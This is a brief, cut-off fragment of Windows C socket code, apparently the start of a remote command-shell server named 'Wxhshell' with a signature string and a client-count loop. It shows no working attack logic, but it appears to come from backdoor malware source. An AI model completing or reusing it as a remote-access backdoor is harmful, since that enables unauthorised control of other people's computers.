#include <windows.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32")

#define OWN_SIGN "virtussign"

int Wxhshell(SOCKET wsl)
{
	SOCKET wsh;
	struct sockaddr_in client;
	DWORD myID;
	int count;
	char cmd[5];

	while (nUser < MAX_USER)
	{
